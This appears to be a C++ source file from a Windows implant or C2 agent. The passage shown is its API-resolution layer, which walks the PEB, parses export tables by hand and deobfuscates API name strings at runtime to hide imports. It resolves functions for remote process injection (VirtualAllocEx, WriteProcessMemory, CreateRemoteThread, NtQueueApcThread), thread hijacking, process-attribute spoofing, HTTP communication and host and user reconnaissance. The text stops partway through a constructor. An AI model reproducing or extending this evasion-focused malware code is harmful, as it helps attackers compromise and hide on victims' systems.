#include <windows.h>
#include <wchar.h>
#include <winternl.h>
#include "utils/buffer.h"
#include "constants.h"
#include "utils/winapi.h"
#include "utils/string_aggregator.h"

/* Global */
HMODULE hNtdll = NULL;

/* Helper methods */

HMODULE GetModuleHandleCustom(PCHAR moduleName)
{
	// Get PEB from GS register (for x64) or FS register (for x86)
#ifdef _WIN64
	PPEB pPeb = (PPEB)((PBYTE)(__readgsqword(96)));
#elif _WIN32
	PPEB pPeb = (PPEB)((PBYTE)(__readfsdword(48)));
#endif

	// Convert module name from ASCII to Unicode
	WCHAR moduleNameW[MAX_PATH * sizeof(WCHAR)];
	Utf8ToWideString(moduleName, moduleNameW);

	// Cycle through modules and select the necessary one
	LIST_ENTRY listEntry = pPeb->Ldr->InMemoryOrderModuleList;
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)listEntry.Flink;
	PLDR_DATA_TABLE_ENTRY pDataTableEntryFirst = (PLDR_DATA_TABLE_ENTRY)listEntry.Flink;
	WCHAR dllNameCurrLower[MAX_PATH] = L"";
	WCHAR moduleNameWLower[MAX_PATH] = L"";

	RtlZeroMemoryCustom((PBYTE)moduleNameWLower, MAX_PATH);
	WideStringToLower(moduleNameW, moduleNameWLower);

	while (TRUE)
	{
		// If current module's name matches, return address to it
		RtlZeroMemoryCustom((PBYTE)dllNameCurrLower, MAX_PATH);
		WideStringToLower(pDataTableEntry->FullDllName.Buffer, dllNameCurrLower);

		if (CompareBuffer(dllNameCurrLower, moduleNameWLower, StrLenW(moduleNameWLower)))
		{
			return (HMODULE)pDataTableEntry->Reserved2[0];
		}

		// Move to next entry
		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pDataTableEntry->Reserved1[0];

		// Break if we reach first element of the circular linked list
		if (pDataTableEntry == pDataTableEntryFirst)
		{
			break;
		}
	}

	// If execution comes here, it means module was not found
	return NULL;
}

PVOID GetProcAddressCustom(HMODULE hModule, PCHAR procName)
{
	// Get length of Procedure name
	DWORD procNameSize = StrLen(procName);

	// Get export data directory
	PBYTE pModuleBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pModuleBase + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pDirectoryExport = (PIMAGE_EXPORT_DIRECTORY)(pModuleBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD pAddressOfNames = (PDWORD)(pModuleBase + (pDirectoryExport->AddressOfNames));
	PWORD pAddressOfOrdinals = (PWORD)(pModuleBase + (pDirectoryExport->AddressOfNameOrdinals));
	PDWORD pAddressOfFunctions = (PDWORD)(pModuleBase + (pDirectoryExport->AddressOfFunctions));
	PVOID pProc = NULL;

	// Prepare strings for forwarded functions check
	CHAR strNtdllDot[STRING_NTDLL_DOT_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_NTDLL_DOT,
		STRING_NTDLL_DOT_LEN,
		strNtdllDot);

	for (int i = 0; i < pDirectoryExport->NumberOfNames; i++)
	{
		PCHAR procNameCurr = (PCHAR)pModuleBase + pAddressOfNames[i];

		if (CompareBuffer(procNameCurr, procName, procNameSize))
		{
			pProc = (PVOID)(pModuleBase + pAddressOfFunctions[pAddressOfOrdinals[i]]);

			// Check for forwarded function; if found, resolve it recursively
			if (CompareBuffer(pProc, strNtdllDot, STRING_NTDLL_DOT_LEN))
			{
				return GetProcAddressCustom(hNtdll, (PCHAR)pProc + STRING_NTDLL_DOT_LEN);
			}

			// If not a forwarded function, return found pointer directly
			else
				return pProc;
		}
	}

	return NULL;
}

HMODULE LoadLibraryCustom(IN PCHAR moduleName)
{
	// Check if library is already loaded; if yes, return its handle
	HMODULE hModuleExisting = GetModuleHandleCustom(moduleName);
	if (hModuleExisting != NULL)
	{
		return hModuleExisting;
	}

	// If library is not already loaded, load it and then return its handle
	else
	{
		// Get handle to Kernel32.dll
		CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = "";
		DeobfuscateUtf8String(
			(PCHAR)STRING_KERNEL32_DLL,
			STRING_KERNEL32_DLL_LEN,
			strKernel32Dll);
		HMODULE hKernel32 = GetModuleHandleCustom(strKernel32Dll);
		if (hKernel32 == NULL)
		{
			return (HMODULE)0;
		}

		// Get LoadLibraryA() address
		CHAR strLoadLibraryA[STRING_LOAD_LIBRARY_A_LEN + 1] = "";
		DeobfuscateUtf8String(
			(PCHAR)STRING_LOAD_LIBRARY_A,
			STRING_LOAD_LIBRARY_A_LEN,
			strLoadLibraryA);
		PVOID pLoadLibraryA = GetProcAddressCustom(hKernel32, strLoadLibraryA);
		if (pLoadLibraryA == NULL)
		{
			return (HMODULE)0;
		}
		HMODULE (*LoadLibraryA)(PCHAR moduleName) = (HMODULE(*)(PCHAR))pLoadLibraryA;

		// Use LoadLibraryA
		return LoadLibraryA(moduleName);
	}
}

DWORD FreeLibraryCustom(IN HMODULE hModule)
{
	// Get handle to Kernel32.dll
	CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNEL32_DLL,
		STRING_KERNEL32_DLL_LEN,
		strKernel32Dll);
	HMODULE hKernel32 = GetModuleHandleCustom(strKernel32Dll);
	if (hKernel32 == NULL)
	{
		return GetLastError();
	}

	// Get FreeLibrary() address
	CHAR strFreeLibrary[STRING_FREE_LIBRARY_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_FREE_LIBRARY,
		STRING_FREE_LIBRARY_LEN,
		strFreeLibrary);
	PVOID pFreeLibrary = GetProcAddressCustom(hKernel32, strFreeLibrary);
	if (pFreeLibrary == NULL)
	{
		return GetLastError();
	}
	BOOL (*FreeLibrary)(HMODULE hLibModule) = (BOOL(*)(HMODULE))pFreeLibrary;

	// Use FreeLibrary
	if (!FreeLibrary(hModule))
	{
		return GetLastError();
	}

	return 0;
}

/* Class for WinAPI functions */
WinApiCustom::WinApiCustom()
{
	// Get necessary strings for modules
	static CHAR strNtdllDll[STRING_NTDLL_DLL_LEN + 1] = ""; // "ntdll.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_NTDLL_DLL,
		STRING_NTDLL_DLL_LEN,
		strNtdllDll);

	static CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = ""; // "Kernel32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNEL32_DLL,
		STRING_KERNEL32_DLL_LEN,
		strKernel32Dll);

	static CHAR strKernelbaseDll[STRING_KERNELBASE_DLL_LEN + 1] = ""; // "kernelbase.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNELBASE_DLL,
		STRING_KERNELBASE_DLL_LEN,
		strKernelbaseDll);

	static CHAR strUser32Dll[STRING_USER32_DLL_LEN + 1] = ""; // "User32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_USER32_DLL,
		STRING_USER32_DLL_LEN,
		strUser32Dll);

	static CHAR strWininetDll[STRING_WININET_DLL_LEN + 1] = ""; // "Wininet.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WININET_DLL,
		STRING_WININET_DLL_LEN,
		strWininetDll);

	static CHAR strBcryptDll[STRING_BCRYPT_DLL_LEN + 1] = ""; // "Bcrypt.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_DLL,
		STRING_BCRYPT_DLL_LEN,
		strBcryptDll);

	static CHAR strAdvapi32Dll[STRING_ADVAPI32_DLL_LEN + 1] = ""; // "Advapi32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_ADVAPI32_DLL,
		STRING_ADVAPI32_DLL_LEN,
		strAdvapi32Dll);

	// Get necessary strings for functions
	static CHAR strMessageBoxA[STRING_MESSAGEBOX_A_LEN + 1] = ""; // "MessageBoxA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_MESSAGEBOX_A,
		STRING_MESSAGEBOX_A_LEN,
		strMessageBoxA);

	static CHAR strLoadLibraryA[STRING_LOAD_LIBRARY_A_LEN + 1] = ""; // "LoadLibraryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_LOAD_LIBRARY_A,
		STRING_LOAD_LIBRARY_A_LEN,
		strLoadLibraryA);

	static CHAR strFreeLibrary[STRING_FREE_LIBRARY_LEN + 1] = ""; // "FreeLibrary"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FREE_LIBRARY,
		STRING_FREE_LIBRARY_LEN,
		strFreeLibrary);

	static CHAR strInternetOpenA[STRING_INTERNET_OPEN_A_LEN + 1] = ""; // "InternetOpenA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_OPEN_A,
		STRING_INTERNET_OPEN_A_LEN,
		strInternetOpenA);

	static CHAR strInternetConnectA[STRING_INTERNET_CONNECT_A_LEN + 1] = ""; // "InternetConnectA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_CONNECT_A,
		STRING_INTERNET_CONNECT_A_LEN,
		strInternetConnectA);

	static CHAR strHttpOpenRequestA[STRING_HTTP_OPEN_REQUEST_A_LEN + 1] = ""; // "HttpOpenRequestA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HTTP_OPEN_REQUEST_A,
		STRING_HTTP_OPEN_REQUEST_A_LEN,
		strHttpOpenRequestA);

	static CHAR strHttpSendRequestA[STRING_HTTP_SEND_REQUEST_A_LEN + 1] = ""; // "HttpSendRequestA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HTTP_SEND_REQUEST_A,
		STRING_HTTP_SEND_REQUEST_A_LEN,
		strHttpSendRequestA);

	static CHAR strInternetReadFile[STRING_INTERNET_READ_FILE_LEN + 1] = ""; // "InternetReadFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_READ_FILE,
		STRING_INTERNET_READ_FILE_LEN,
		strInternetReadFile);

	static CHAR strInternetCloseHandle[STRING_INTERNET_CLOSE_HANDLE_LEN + 1] = ""; // "InternetCloseHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_CLOSE_HANDLE,
		STRING_INTERNET_CLOSE_HANDLE_LEN,
		strInternetCloseHandle);

	static CHAR strInternetSetOptionA[STRING_INTERNET_SET_OPTION_A_LEN + 1] = ""; // "InternetSetOptionA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_SET_OPTION_A,
		STRING_INTERNET_SET_OPTION_A_LEN,
		strInternetSetOptionA);

	static CHAR strGetProcessHeap[STRING_GET_PROCESS_HEAP_LEN + 1] = ""; // "GetProcessHeap"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_PROCESS_HEAP,
		STRING_GET_PROCESS_HEAP_LEN,
		strGetProcessHeap);

	static CHAR strHeapAlloc[STRING_HEAP_ALLOC_LEN + 1] = ""; // "HeapAlloc"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_ALLOC,
		STRING_HEAP_ALLOC_LEN,
		strHeapAlloc);

	static CHAR strHeapReAlloc[STRING_HEAP_RE_ALLOC_LEN + 1] = ""; // "HeapReAlloc"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_RE_ALLOC,
		STRING_HEAP_RE_ALLOC_LEN,
		strHeapReAlloc);

	static CHAR strHeapFree[STRING_HEAP_FREE_LEN + 1] = ""; // "HeapFree"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_FREE,
		STRING_HEAP_FREE_LEN,
		strHeapFree);

	static CHAR strGetLastError[STRING_GET_LAST_ERROR_LEN + 1] = ""; // "GetLastError"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_LAST_ERROR,
		STRING_GET_LAST_ERROR_LEN,
		strGetLastError);

	static CHAR strBCryptOpenAlgorithmProvider[STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER_LEN + 1] = ""; // "BCryptOpenAlgorithmProvider"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER,
		STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER_LEN,
		strBCryptOpenAlgorithmProvider);

	static CHAR strBCryptCloseAlgorithmProvider[STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER_LEN + 1] = ""; // "BCryptCloseAlgorithmProvider"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER,
		STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER_LEN,
		strBCryptCloseAlgorithmProvider);

	static CHAR strBCryptGenRandom[STRING_BCRYPT_GEN_RANDOM_LEN + 1] = ""; // "BCryptGenRandom"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_GEN_RANDOM,
		STRING_BCRYPT_GEN_RANDOM_LEN,
		strBCryptGenRandom);

	static CHAR strCreateThread[STRING_CREATE_THREAD_LEN + 1] = ""; // "CreateThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_THREAD,
		STRING_CREATE_THREAD_LEN,
		strCreateThread);

	static CHAR strCreateMutexA[STRING_CREATE_MUTEX_A_LEN + 1] = ""; // "CreateMutexA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_MUTEX_A,
		STRING_CREATE_MUTEX_A_LEN,
		strCreateMutexA);

	static CHAR strWaitForSingleObject[STRING_WAIT_FOR_SINGLE_OBJECT_LEN + 1] = ""; // "WaitForSingleObject"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WAIT_FOR_SINGLE_OBJECT,
		STRING_WAIT_FOR_SINGLE_OBJECT_LEN,
		strWaitForSingleObject);

	static CHAR strReleaseMutex[STRING_RELEASE_MUTEX_LEN + 1] = ""; // "ReleaseMutex"
	DeobfuscateUtf8String(
		(PCHAR)STRING_RELEASE_MUTEX,
		STRING_RELEASE_MUTEX_LEN,
		strReleaseMutex);

	static CHAR strCloseHandle[STRING_CLOSE_HANDLE_LEN + 1] = ""; // "CloseHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CLOSE_HANDLE,
		STRING_CLOSE_HANDLE_LEN,
		strCloseHandle);

	static CHAR strCreateEventA[STRING_CREATE_EVENT_A_LEN + 1] = ""; // "CreateEventA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_EVENT_A,
		STRING_CREATE_EVENT_A_LEN,
		strCreateEventA);

	static CHAR strSetEvent[STRING_SET_EVENT_LEN + 1] = ""; // "SetEvent"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SET_EVENT,
		STRING_SET_EVENT_LEN,
		strSetEvent);

	static CHAR strResetEvent[STRING_RESET_EVENT_LEN + 1] = ""; // "ResetEvent"
	DeobfuscateUtf8String(
		(PCHAR)STRING_RESET_EVENT,
		STRING_RESET_EVENT_LEN,
		strResetEvent);

	static CHAR strGetComputerNameExA[STRING_GET_COMPUTER_NAME_EX_A_LEN + 1] = ""; // "GetComputerNameExA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_COMPUTER_NAME_EX_A,
		STRING_GET_COMPUTER_NAME_EX_A_LEN,
		strGetComputerNameExA);

	static CHAR strOpenProcessToken[STRING_OPEN_PROCESS_TOKEN_LEN + 1] = ""; // "OpenProcessToken"
	DeobfuscateUtf8String(
		(PCHAR)STRING_OPEN_PROCESS_TOKEN,
		STRING_OPEN_PROCESS_TOKEN_LEN,
		strOpenProcessToken);

	static CHAR strGetTokenInformation[STRING_GET_TOKEN_INFORMATION_LEN + 1] = ""; // "GetTokenInformation"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_TOKEN_INFORMATION,
		STRING_GET_TOKEN_INFORMATION_LEN,
		strGetTokenInformation);

	static CHAR strLookupAccountSidA[STRING_LOOKUP_ACCOUNT_SID_A_LEN + 1] = ""; // "LookupAccountSidA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_LOOKUP_ACCOUNT_SID_A,
		STRING_LOOKUP_ACCOUNT_SID_A_LEN,
		strLookupAccountSidA);

	static CHAR strGetCurrentDirectoryA[STRING_GET_CURRENT_DIRECTORY_A_LEN + 1] = ""; // "GetCurrentDirectoryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_CURRENT_DIRECTORY_A,
		STRING_GET_CURRENT_DIRECTORY_A_LEN,
		strGetCurrentDirectoryA);

	static CHAR strSetCurrentDirectoryA[STRING_SET_CURRENT_DIRECTORY_A_LEN + 1] = ""; // "SetCurrentDirectoryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SET_CURRENT_DIRECTORY_A,
		STRING_SET_CURRENT_DIRECTORY_A_LEN,
		strSetCurrentDirectoryA);

	static CHAR strCreateFileA[STRING_CREATE_FILE_A_LEN + 1] = ""; // "CreateFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_FILE_A,
		STRING_CREATE_FILE_A_LEN,
		strCreateFileA);

	static CHAR strGetFileSizeEx[STRING_GET_FILE_SIZE_EX_LEN + 1] = ""; // "GetFileSizeEx"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_FILE_SIZE_EX,
		STRING_GET_FILE_SIZE_EX_LEN,
		strGetFileSizeEx);

	static CHAR strCreateFileMappingA[STRING_CREATE_FILE_MAPPING_A_LEN + 1] = ""; // "CreateFileMappingA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_FILE_MAPPING_A,
		STRING_CREATE_FILE_MAPPING_A_LEN,
		strCreateFileMappingA);

	static CHAR strMapViewOfFile[STRING_MAP_VIEW_OF_FILE_LEN + 1] = ""; // "MapViewOfFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_MAP_VIEW_OF_FILE,
		STRING_MAP_VIEW_OF_FILE_LEN,
		strMapViewOfFile);

	static CHAR strUnmapViewOfFile[STRING_UNMAP_VIEW_OF_FILE_LEN + 1] = ""; // "UnmapViewOfFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_UNMAP_VIEW_OF_FILE,
		STRING_UNMAP_VIEW_OF_FILE_LEN,
		strUnmapViewOfFile);

	static CHAR strFlushViewOfFile[STRING_FLUSH_VIEW_OF_FILE_LEN + 1] = ""; // "FlushViewOfFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FLUSH_VIEW_OF_FILE,
		STRING_FLUSH_VIEW_OF_FILE_LEN,
		strFlushViewOfFile);

	static CHAR strFlushFileBuffers[STRING_FLUSH_FILE_BUFFERS_LEN + 1] = ""; // "FlushFileBuffers"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FLUSH_FILE_BUFFERS,
		STRING_FLUSH_FILE_BUFFERS_LEN,
		strFlushFileBuffers);

	static CHAR strGetSecurityInfo[STRING_GET_SECURITY_INFO_LEN + 1] = ""; // "GetSecurityInfo"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_SECURITY_INFO,
		STRING_GET_SECURITY_INFO_LEN,
		strGetSecurityInfo);

	static CHAR strLocalFree[STRING_LOCAL_FREE_LEN + 1] = ""; // "LocalFree"
	DeobfuscateUtf8String(
		(PCHAR)STRING_LOCAL_FREE,
		STRING_LOCAL_FREE_LEN,
		strLocalFree);

	static CHAR strFindFirstFileA[STRING_FIND_FIRST_FILE_A_LEN + 1] = ""; // "FindFirstFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FIND_FIRST_FILE_A,
		STRING_FIND_FIRST_FILE_A_LEN,
		strFindFirstFileA);

	static CHAR strFindNextFileA[STRING_FIND_NEXT_FILE_A_LEN + 1] = ""; // "FindNextFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FIND_NEXT_FILE_A,
		STRING_FIND_NEXT_FILE_A_LEN,
		strFindNextFileA);

	static CHAR strFindClose[STRING_FIND_CLOSE_LEN + 1] = ""; // "FindClose"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FIND_CLOSE,
		STRING_FIND_CLOSE_LEN,
		strFindClose);

	static CHAR strGetFileAttributesA[STRING_GET_FILE_ATTRIBUTES_A_LEN + 1] = ""; // "GetFileAttributesA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_FILE_ATTRIBUTES_A,
		STRING_GET_FILE_ATTRIBUTES_A_LEN,
		strGetFileAttributesA);

	static CHAR strCopyFileA[STRING_COPY_FILE_A_LEN + 1] = ""; // "CopyFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_COPY_FILE_A,
		STRING_COPY_FILE_A_LEN,
		strCopyFileA);

	static CHAR strCreateDirectoryA[STRING_CREATE_DIRECTORY_A_LEN + 1] = ""; // "CreateDirectoryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_DIRECTORY_A,
		STRING_CREATE_DIRECTORY_A_LEN,
		strCreateDirectoryA);

	static CHAR strFileTimeToSystemTime[STRING_FILE_TIME_TO_SYSTEM_TIME_LEN + 1] = ""; // "FileTimeToSystemTime"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FILE_TIME_TO_SYSTEM_TIME,
		STRING_FILE_TIME_TO_SYSTEM_TIME_LEN,
		strFileTimeToSystemTime);

	static CHAR strGetDateFormatEx[STRING_GET_DATE_FORMAT_EX_LEN + 1] = ""; // "GetDateFormatEx"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_DATE_FORMAT_EX,
		STRING_GET_DATE_FORMAT_EX_LEN,
		strGetDateFormatEx);

	static CHAR strGetTimeFormatEx[STRING_GET_TIME_FORMAT_EX_LEN + 1] = ""; // "GetTimeFormatEx"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_TIME_FORMAT_EX,
		STRING_GET_TIME_FORMAT_EX_LEN,
		strGetTimeFormatEx);

	static CHAR strMoveFileExA[STRING_MOVE_FILE_EX_A_LEN + 1] = ""; // "MoveFileExA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_MOVE_FILE_EX_A,
		STRING_MOVE_FILE_EX_A_LEN,
		strMoveFileExA);

	static CHAR strSetFilePointerEx[STRING_SET_FILE_POINTER_EX_LEN + 1] = ""; // "SetFilePointerEx"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SET_FILE_POINTER_EX,
		STRING_SET_FILE_POINTER_EX_LEN,
		strSetFilePointerEx);

	static CHAR strWriteFile[STRING_WRITE_FILE_LEN + 1] = ""; // "WriteFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WRITE_FILE,
		STRING_WRITE_FILE_LEN,
		strWriteFile);

	static CHAR strDeleteFileA[STRING_DELETE_FILE_A_LEN + 1] = ""; // "DeleteFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_DELETE_FILE_A,
		STRING_DELETE_FILE_A_LEN,
		strDeleteFileA);

	static CHAR strRemoveDirectoryA[STRING_REMOVE_DIRECTORY_A_LEN + 1] = ""; // "RemoveDirectoryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_REMOVE_DIRECTORY_A,
		STRING_REMOVE_DIRECTORY_A_LEN,
		strRemoveDirectoryA);

	static CHAR strHeapValidate[STRING_HEAP_VALIDATE_LEN + 1] = ""; // "HeapValidate"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_VALIDATE,
		STRING_HEAP_VALIDATE_LEN,
		strHeapValidate);

	static CHAR strConvertSidToStringSidA[STRING_CONVERT_SID_TO_STRING_SID_A_LEN + 1] = ""; // "ConvertSidToStringSidA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CONVERT_SID_TO_STRING_SID_A,
		STRING_CONVERT_SID_TO_STRING_SID_A_LEN,
		strConvertSidToStringSidA);

	static CHAR strNtQuerySystemInformation[STRING_NT_QUERY_SYSTEM_INFORMATION_LEN + 1] = ""; // "NtQuerySystemInformation"
	DeobfuscateUtf8String(
		(PCHAR)STRING_NT_QUERY_SYSTEM_INFORMATION,
		STRING_NT_QUERY_SYSTEM_INFORMATION_LEN,
		strNtQuerySystemInformation);

	static CHAR strInitializeProcThreadAttributeList[STRING_INITIALIZE_PROC_THREAD_ATTRIBUTE_LIST_LEN + 1] = ""; // "InitializeProcThreadAttributeList"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INITIALIZE_PROC_THREAD_ATTRIBUTE_LIST,
		STRING_INITIALIZE_PROC_THREAD_ATTRIBUTE_LIST_LEN,
		strInitializeProcThreadAttributeList);

	static CHAR strUpdateProcThreadAttribute[STRING_UPDATE_PROC_THREAD_ATTRIBUTE_LEN + 1] = ""; // "UpdateProcThreadAttribute"
	DeobfuscateUtf8String(
		(PCHAR)STRING_UPDATE_PROC_THREAD_ATTRIBUTE,
		STRING_UPDATE_PROC_THREAD_ATTRIBUTE_LEN,
		strUpdateProcThreadAttribute);

	static CHAR strOpenProcess[STRING_OPEN_PROCESS_LEN + 1] = ""; // "OpenProcess"
	DeobfuscateUtf8String(
		(PCHAR)STRING_OPEN_PROCESS,
		STRING_OPEN_PROCESS_LEN,
		strOpenProcess);

	static CHAR strDeleteProcThreadAttributeList[STRING_DELETE_PROC_THREAD_ATTRIBUTE_LIST_LEN + 1] = ""; // "DeleteProcThreadAttributeList"
	DeobfuscateUtf8String(
		(PCHAR)STRING_DELETE_PROC_THREAD_ATTRIBUTE_LIST,
		STRING_DELETE_PROC_THREAD_ATTRIBUTE_LIST_LEN,
		strDeleteProcThreadAttributeList);

	static CHAR strGetEnvironmentVariableA[STRING_GET_ENVIRONMENT_VARIABLE_A_LEN + 1] = ""; // "GetEnvironmentVariableA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_ENVIRONMENT_VARIABLE_A,
		STRING_GET_ENVIRONMENT_VARIABLE_A_LEN,
		strGetEnvironmentVariableA);

	static CHAR strResumeThread[STRING_RESUME_THREAD_LEN + 1] = ""; // "ResumeThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_RESUME_THREAD,
		STRING_RESUME_THREAD_LEN,
		strResumeThread);

	static CHAR strReadProcessMemory[STRING_READ_PROCESS_MEMORY_LEN + 1] = ""; // "ReadProcessMemory"
	DeobfuscateUtf8String(
		(PCHAR)STRING_READ_PROCESS_MEMORY,
		STRING_READ_PROCESS_MEMORY_LEN,
		strReadProcessMemory);

	static CHAR strWriteProcessMemory[STRING_WRITE_PROCESS_MEMORY_LEN + 1] = ""; // "WriteProcessMemory"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WRITE_PROCESS_MEMORY,
		STRING_WRITE_PROCESS_MEMORY_LEN,
		strWriteProcessMemory);

	static CHAR strCreateProcessA[STRING_CREATE_PROCESS_A_LEN + 1] = ""; // "CreateProcessA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_PROCESS_A,
		STRING_CREATE_PROCESS_A_LEN,
		strCreateProcessA);

	static CHAR strNtQueryInformationProcess[STRING_NT_QUERY_INFORMATION_PROCESS_LEN + 1] = ""; // "NtQueryInformationProcess"
	DeobfuscateUtf8String(
		(PCHAR)STRING_NT_QUERY_INFORMATION_PROCESS,
		STRING_NT_QUERY_INFORMATION_PROCESS_LEN,
		strNtQueryInformationProcess);

	static CHAR strTerminateProcess[STRING_TERMINATE_PROCESS_LEN + 1] = ""; // "TerminateProcess"
	DeobfuscateUtf8String(
		(PCHAR)STRING_TERMINATE_PROCESS,
		STRING_TERMINATE_PROCESS_LEN,
		strTerminateProcess);

	static CHAR strOpenThread[STRING_OPEN_THREAD_LEN + 1] = ""; // "OpenThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_OPEN_THREAD,
		STRING_OPEN_THREAD_LEN,
		strOpenThread);

	static CHAR strSuspendThread[STRING_SUSPEND_THREAD_LEN + 1] = ""; // "SuspendThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SUSPEND_THREAD,
		STRING_SUSPEND_THREAD_LEN,
		strSuspendThread);

	static CHAR strDuplicateHandle[STRING_DUPLICATE_HANDLE_LEN + 1] = ""; // "DuplicateHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_DUPLICATE_HANDLE,
		STRING_DUPLICATE_HANDLE_LEN,
		strDuplicateHandle);

	static CHAR strNtQueueApcThread[STRING_NT_QUEUE_APC_THREAD_LEN + 1] = ""; // "NtQueueApcThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_NT_QUEUE_APC_THREAD,
		STRING_NT_QUEUE_APC_THREAD_LEN,
		strNtQueueApcThread);

	static CHAR strNtTestAlert[STRING_NT_TEST_ALERT_LEN + 1] = ""; // "NtTestAlert"
	DeobfuscateUtf8String(
		(PCHAR)STRING_NT_TEST_ALERT,
		STRING_NT_TEST_ALERT_LEN,
		strNtTestAlert);

	static CHAR strCreateRemoteThread[STRING_CREATE_REMOTE_THREAD_LEN + 1] = ""; // "CreateRemoteThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_REMOTE_THREAD,
		STRING_CREATE_REMOTE_THREAD_LEN,
		strCreateRemoteThread);

	static CHAR strGetProcAddress[STRING_GET_PROC_ADDRESS_LEN + 1] = ""; // "GetProcAddress"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_PROC_ADDRESS,
		STRING_GET_PROC_ADDRESS_LEN,
		strGetProcAddress);

	static CHAR strVirtualProtectEx[STRING_VIRTUAL_PROTECT_EX_LEN + 1] = ""; // "VirtualProtectEx"
	DeobfuscateUtf8String(
		(PCHAR)STRING_VIRTUAL_PROTECT_EX,
		STRING_VIRTUAL_PROTECT_EX_LEN,
		strVirtualProtectEx);

	static CHAR strVirtualAllocEx[STRING_VIRTUAL_ALLOC_EX_LEN + 1] = ""; // "VirtualAllocEx"
	DeobfuscateUtf8String(
		(PCHAR)STRING_VIRTUAL_ALLOC_EX,
		STRING_VIRTUAL_ALLOC_EX_LEN,
		strVirtualAllocEx);

